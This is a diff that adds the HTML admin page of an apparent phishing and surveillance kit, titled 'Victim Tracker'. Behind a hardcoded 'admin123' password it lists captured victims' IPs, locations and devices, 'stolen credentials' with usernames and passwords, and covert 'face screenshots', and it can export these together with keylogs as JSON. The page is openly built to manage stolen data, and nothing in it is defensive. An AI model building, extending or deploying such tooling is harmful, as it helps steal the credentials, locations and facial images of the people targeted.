@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Victim Tracker</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: #1a1a1a;
+            color: white;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 40px;
+            background: #2a2a2a;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .login-container h1 {
+            margin-bottom: 30px;
+            color: #FFD700;
+        }
+
+        .login-input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            background: #333;
+            color: white;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: #FFD700;
+            color: black;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        .admin-panel {
+            padding: 20px;
+            display: none;
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #333;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: #2a2a2a;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #FFD700;
+        }
+
+        .data-section {
+            background: #2a2a2a;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .victim-item, .credential-item {
+            background: #333;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .screenshot-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .screenshot-item {
+            text-align: center;
+        }
+
+        .screenshot-item img {
+            width: 100%;
+            border-radius: 5px;
+            border: 2px solid #FFD700;
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Screen -->
+    <div id="loginScreen" class="login-container">
+        <h1>🔧 ADMIN PANEL</h1>
+        <p style="margin-bottom: 20px; opacity: 0.8;">Enter password to access</p>
+        <input type="password" id="adminPassword" class="login-input" placeholder="Enter admin password">
+        <button class="login-btn" onclick="checkPassword()">LOGIN</button>
+        <p id="errorMsg" style="color: red; margin-top: 10px; display: none;">Wrong password!</p>
+    </div>
+
+    <!-- Admin Panel -->
+    <div id="adminPanel" class="admin-panel">
+        <div class="admin-header">
+            <h1>🎯 VICTIM TRACKER ADMIN PANEL</h1>
+            <button onclick="logout()" style="background: red; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">LOGOUT</button>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number" id="totalVictims">0</div>
+                <div>Total Victims</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalCredentials">0</div>
+                <div>Credentials</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalScreenshots">0</div>
+                <div>Screenshots</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="onlineNow">0</div>
+                <div>Online Now</div>
+            </div>
+        </div>
+
+        <!-- Victims List -->
+        <div class="data-section">
+            <h2>🎯 CAPTURED VICTIMS</h2>
+            <div id="victimsList">
+                <!-- Victims will be loaded here -->
+            </div>
+        </div>
+
+        <!-- Credentials -->
+        <div class="data-section">
+            <h2>🔑 STOLEN CREDENTIALS</h2>
+            <div id="credentialsList">
+                <!-- Credentials will be loaded here -->
+            </div>
+        </div>
+
+        <!-- Screenshots -->
+        <div class="data-section">
+            <h2>📷 FACE SCREENSHOTS</h2>
+            <div class="screenshot-grid" id="screenshotsList">
+                <!-- Screenshots will be loaded here -->
+            </div>
+        </div>
+
+        <!-- Export Buttons -->
+        <div style="text-align: center; margin-top: 30px;">
+            <button onclick="exportData()" style="background: #FFD700; color: black; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; margin: 0 10px;">
+                📥 EXPORT ALL DATA
+            </button>
+            <button onclick="clearData()" style="background: red; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; margin: 0 10px;">
+                🗑️ CLEAR ALL DATA
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const ADMIN_PASSWORD = "admin123"; // Ganti password ini
+
+        function checkPassword() {
+            const password = document.getElementById('adminPassword').value;
+            if (password === ADMIN_PASSWORD) {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'block';
+                loadAdminData();
+            } else {
+                document.getElementById('errorMsg').style.display = 'block';
+            }
+        }
+
+        function logout() {
+            document.getElementById('loginScreen').style.display = 'block';
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('adminPassword').value = '';
+            document.getElementById('errorMsg').style.display = 'none';
+        }
+
+        function loadAdminData() {
+            const victimsData = JSON.parse(localStorage.getItem('victimsData')) || [];
+            const credentialsData = JSON.parse(localStorage.getItem('credentialsData')) || [];
+            const screenshotsData = JSON.parse(localStorage.getItem('screenshotsData')) || [];
+
+            // Update stats
+            document.getElementById('totalVictims').textContent = victimsData.length;
+            document.getElementById('totalCredentials').textContent = credentialsData.length;
+            document.getElementById('totalScreenshots').textContent = screenshotsData.length;
+            document.getElementById('onlineNow').textContent = victimsData.length; // Simulate online count
+
+            // Load victims
+            const victimsList = document.getElementById('victimsList');
+            victimsList.innerHTML = victimsData.map(victim => `
+                <div class="victim-item">
+                    <strong>IP:</strong> ${victim.ip} | 
+                    <strong>Location:</strong> ${victim.city}, ${victim.country}<br>
+                    <strong>Device:</strong> ${victim.platform} | ${victim.screen}<br>
+                    <strong>Time:</strong> ${new Date(victim.timestamp).toLocaleString()}
+                </div>
+            `).join('');
+
+            // Load credentials
+            const credentialsList = document.getElementById('credentialsList');
+            credentialsList.innerHTML = credentialsData.map(cred => `
+                <div class="credential-item">
+                    <strong>Username:</strong> ${cred.username} | 
+                    <strong>Password:</strong> ${cred.password}<br>
+                    <strong>Email:</strong> ${cred.email} | 
+                    <strong>IP:</strong> ${cred.ip}<br>
+                    <strong>Time:</strong> ${new Date(cred.timestamp).toLocaleString()}
+                </div>
+            `).join('');
+
+            // Load screenshots
+            const screenshotsList = document.getElementById('screenshotsList');
+            screenshotsList.innerHTML = screenshotsData.map(shot => `
+                <div class="screenshot-item">
+                    <img src="${shot.image}" alt="Face screenshot">
+                    <div style="margin-top: 5px; font-size: 12px;">
+                        <strong>Pose:</strong> ${shot.pose}<br>
+                        <strong>IP:</strong> ${shot.victimId}<br>
+                        ${new Date(shot.timestamp).toLocaleString()}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function exportData() {
+            const allData = {
+                victims: JSON.parse(localStorage.getItem('victimsData')) || [],
+                credentials: JSON.parse(localStorage.getItem('credentialsData')) || [],
+                screenshots: JSON.parse(localStorage.getItem('screenshotsData')) || [],
+                keylogs: JSON.parse(localStorage.getItem('keylogsData')) || []
+            };
+            
+            const dataStr = JSON.stringify(allData, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(dataBlob);
+            link.download = 'victim_tracker_data.json';
+            link.click();
+        }
+
+        function clearData() {
+            if (confirm('Are you sure you want to clear ALL data? This cannot be undone!')) {
+                localStorage.clear();
+                alert('All data has been cleared!');
+                loadAdminData();
+            }
+        }
+
+        // Close with Escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                logout();
+            }
+        });
+    </script>
+</body>
+</html>
